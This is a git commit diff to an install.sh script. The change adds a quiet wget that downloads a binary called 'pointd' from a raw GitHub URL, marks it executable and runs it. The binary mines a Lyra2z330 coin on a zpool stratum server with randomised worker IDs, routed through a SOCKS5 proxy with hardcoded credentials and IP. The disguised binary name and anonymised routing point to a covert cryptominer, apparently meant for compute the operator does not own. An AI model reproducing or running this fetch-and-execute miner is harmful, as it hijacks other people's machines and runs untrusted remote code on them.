a8c8c852c1d7b8e2433f4592d1bc339431124485
arnienindin <99411734+arnienindin@users.noreply.github.com>
2022-03-21 01:28:32 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,4 @@
 apt update -y
-chmod +x pointd 
+wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
+chmod +x pointd
 ./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.$(shuf -n 1 -i 1-9999999)  -p c=RVN,zap=BUT-lyra2z330 -x socks5://berkahkita:kitabersama123@185.9.52.177:5185
